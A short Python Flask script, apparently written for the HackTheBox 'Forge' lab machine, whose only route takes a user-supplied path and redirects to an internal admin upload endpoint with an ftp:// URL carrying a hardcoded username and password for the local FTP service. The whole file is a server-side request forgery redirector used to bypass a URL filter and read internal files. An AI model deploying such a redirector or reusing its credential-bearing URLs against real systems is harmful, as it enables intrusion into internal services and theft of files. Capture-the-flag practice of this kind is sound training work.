from flask import Flask, request, redirect

app = Flask(__name__)

@app.route("/")
def root():
    f = request.args.get('f', default='')
    return redirect(f'http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/{f}')
